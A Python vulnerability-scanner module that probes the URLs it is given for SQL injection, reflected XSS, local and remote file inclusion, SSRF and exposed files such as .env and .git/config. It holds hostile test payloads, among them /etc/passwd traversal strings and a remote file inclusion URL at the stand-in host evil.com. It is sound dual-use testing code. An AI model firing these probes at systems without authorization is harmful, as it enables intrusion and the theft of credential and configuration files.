#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import logging
import json
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
from urllib.parse import urljoin, urlparse
from .utils import get_user_agent

# Initialize console
console = Console()

class VulnerabilityScanner:
    """Class for scanning and identifying vulnerabilities in a target domain"""
    
    def __init__(self, domain, threads=10, timeout=30):
        """Initialize the VulnerabilityScanner class
        
        Args:
            domain (str): Target domain
            threads (int): Number of threads to use
            timeout (int): Request timeout in seconds
        """
        self.domain = domain
        self.threads = threads
        self.timeout = timeout
        self.user_agent = get_user_agent()
        self.logger = logging.getLogger('domain_scanner.vuln_scanner')
        self.vulnerabilities = []
        
        # Common vulnerability patterns
        self.patterns = {
            'sql_injection': [
                "sql syntax",
                "mysql error",
                "postgresql error",
                "ora-",
                "sql error"
            ],
            'xss': [
                '<script>alert(1)</script>',
                '"<script>alert(1)</script>',
                "'<script>alert(1)</script>"
            ],
            'lfi': [
                '../../../etc/passwd',
                '....//....//....//etc/passwd',
                '/etc/passwd'
            ],
            'rfi': [
                'http://evil.com/shell.php',
                'https://evil.com/shell.php'
            ],
            'ssrf': [
                'http://127.0.0.1',
                'http://localhost',
                'file:///etc/passwd'
            ]
        }
    
    def scan(self, urls):
        """Scan the target domain for vulnerabilities
        
        Args:
            urls (list): List of URLs to scan
            
        Returns:
            list: Discovered vulnerabilities
        """
        self.logger.info(f"Starting vulnerability scan for {self.domain}")
        
        with Progress() as progress:
            # Create tasks for each vulnerability type
            tasks = {}
            tasks['injection'] = progress.add_task("[red]Scanning for Injection Vulnerabilities", total=len(urls))
            tasks['xss'] = progress.add_task("[red]Scanning for XSS Vulnerabilities", total=len(urls))
            tasks['file_inclusion'] = progress.add_task("[red]Scanning for File Inclusion", total=len(urls))
            tasks['ssrf'] = progress.add_task("[red]Scanning for SSRF", total=len(urls))
            tasks['misconfig'] = progress.add_task("[red]Checking Misconfigurations", total=1)
            
            # Scan each URL for vulnerabilities
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                for url in urls:
                    executor.submit(self._scan_url, url, tasks, progress)
            
            # Check for security misconfigurations
            self._check_misconfigurations()
            progress.update(tasks['misconfig'], advance=1)
        
        # Display results
        self._display_results()
        
        return self.vulnerabilities
    
    def _scan_url(self, url, tasks, progress):
        """Scan a single URL for vulnerabilities
        
        Args:
            url (str): URL to scan
            tasks (dict): Progress tasks
            progress (Progress): Progress bar
        """
        try:
            # Test for SQL injection
            self._test_sql_injection(url)
            progress.update(tasks['injection'], advance=1)
            
            # Test for XSS
            self._test_xss(url)
            progress.update(tasks['xss'], advance=1)
            
            # Test for file inclusion
            self._test_file_inclusion(url)
            progress.update(tasks['file_inclusion'], advance=1)
            
            # Test for SSRF
            self._test_ssrf(url)
            progress.update(tasks['ssrf'], advance=1)
            
        except Exception as e:
            self.logger.error(f"Error scanning {url}: {str(e)}")
    
    def _test_sql_injection(self, url):
        """Test for SQL injection vulnerabilities"""
        payloads = [
            "'",
            '"',
            "1' OR '1'='1",
            '1" OR "1"="1',
            "1' AND '1'='1",
            "1' AND SLEEP(5)--"
        ]
        
        for payload in payloads:
            try:
                # Test GET parameters
                response = requests.get(
                    url + payload,
                    headers={'User-Agent': self.user_agent},
                    timeout=self.timeout,
                    verify=False
                )
                
                # Check for SQL error patterns
                for pattern in self.patterns['sql_injection']:
                    if pattern.lower() in response.text.lower():
                        self.vulnerabilities.append({
                            'type': 'SQL Injection',
                            'url': url,
                            'payload': payload,
                            'evidence': pattern
                        })
                        break
                        
            except Exception as e:
                self.logger.debug(f"Error testing SQL injection on {url}: {str(e)}")
    
    def _test_xss(self, url):
        """Test for Cross-Site Scripting (XSS) vulnerabilities"""
        for payload in self.patterns['xss']:
            try:
                response = requests.get(
                    url + payload,
                    headers={'User-Agent': self.user_agent},
                    timeout=self.timeout,
                    verify=False
                )
                
                if payload in response.text:
                    self.vulnerabilities.append({
                        'type': 'Cross-Site Scripting (XSS)',
                        'url': url,
                        'payload': payload,
                        'evidence': 'Payload reflected in response'
                    })
                    
            except Exception as e:
                self.logger.debug(f"Error testing XSS on {url}: {str(e)}")
    
    def _test_file_inclusion(self, url):
        """Test for Local/Remote File Inclusion vulnerabilities"""
        # Test LFI
        for payload in self.patterns['lfi']:
            try:
                response = requests.get(
                    url + payload,
                    headers={'User-Agent': self.user_agent},
                    timeout=self.timeout,
                    verify=False
                )
                
                if 'root:x:' in response.text:
                    self.vulnerabilities.append({
                        'type': 'Local File Inclusion',
                        'url': url,
                        'payload': payload,
                        'evidence': 'System file contents exposed'
                    })
                    
            except Exception as e:
                self.logger.debug(f"Error testing LFI on {url}: {str(e)}")
        
        # Test RFI
        for payload in self.patterns['rfi']:
            try:
                response = requests.get(
                    url + payload,
                    headers={'User-Agent': self.user_agent},
                    timeout=self.timeout,
                    verify=False
                )
                
                if 'shell' in response.text.lower():
                    self.vulnerabilities.append({
                        'type': 'Remote File Inclusion',
                        'url': url,
                        'payload': payload,
                        'evidence': 'Remote file inclusion possible'
                    })
                    
            except Exception as e:
                self.logger.debug(f"Error testing RFI on {url}: {str(e)}")
    
    def _test_ssrf(self, url):
        """Test for Server-Side Request Forgery vulnerabilities"""
        for payload in self.patterns['ssrf']:
            try:
                response = requests.get(
                    url + payload,
                    headers={'User-Agent': self.user_agent},
                    timeout=self.timeout,
                    verify=False
                )
                
                if 'root:x:' in response.text or 'localhost' in response.text.lower():
                    self.vulnerabilities.append({
                        'type': 'Server-Side Request Forgery',
                        'url': url,
                        'payload': payload,
                        'evidence': 'Internal resource access possible'
                    })
                    
            except Exception as e:
                self.logger.debug(f"Error testing SSRF on {url}: {str(e)}")
    
    def _check_misconfigurations(self):
        """Check for common security misconfigurations"""
        checks = [
            ('/.git/config', 'Git Repository Exposure'),
            ('/.env', 'Environment File Exposure'),
            ('/wp-config.php', 'WordPress Config Exposure'),
            ('/phpinfo.php', 'PHP Info Exposure'),
            ('/server-status', 'Apache Server Status Exposure'),
            ('/.htaccess', 'htaccess File Exposure'),
            ('/backup', 'Backup Directory Exposure'),
            ('/admin', 'Admin Interface Exposure')
        ]
        
        base_url = f"https://{self.domain}" if self._is_https() else f"http://{self.domain}"
        
        for path, issue in checks:
            try:
                url = urljoin(base_url, path)
                response = requests.get(
                    url,
                    headers={'User-Agent': self.user_agent},
                    timeout=self.timeout,
                    verify=False
                )
                
                if response.status_code == 200:
                    self.vulnerabilities.append({
                        'type': 'Security Misconfiguration',
                        'url': url,
                        'issue': issue,
                        'evidence': f'Resource accessible (Status: {response.status_code})'
                    })
                    
            except Exception as e:
                self.logger.debug(f"Error checking {path}: {str(e)}")
    
    def _is_https(self):
        """Check if the domain supports HTTPS"""
        try:
            requests.get(
                f"https://{self.domain}",
                headers={'User-Agent': self.user_agent},
                timeout=self.timeout,
                verify=False
            )
            return True
        except:
            return False
    
    def _display_results(self):
        """Display vulnerability scan results"""
        if not self.vulnerabilities:
            console.print("\n[green]No vulnerabilities found![/green]")
            return
        
        # Create results table
        table = Table(title="Vulnerability Scan Results")
        table.add_column("Type", style="red")
        table.add_column("URL", style="blue")
        table.add_column("Issue/Payload", style="yellow")
        table.add_column("Evidence", style="green")
        
        for vuln in self.vulnerabilities:
            table.add_row(
                vuln['type'],
                vuln['url'],
                vuln.get('payload', vuln.get('issue', '')),
                vuln['evidence']
            )
        
        console.print(table)
        
        # Save results to file
        self._save_results()
    
    def _save_results(self):
        """Save vulnerability scan results to a file"""
        try:
            filename = f"{self.domain}_vulnerabilities.json"
            with open(filename, 'w') as f:
                json.dump(self.vulnerabilities, f, indent=4)
            console.print(f"\n[green]Results saved to {filename}[/green]")
            
        except Exception as e:
            self.logger.error(f"Error saving results: {str(e)}")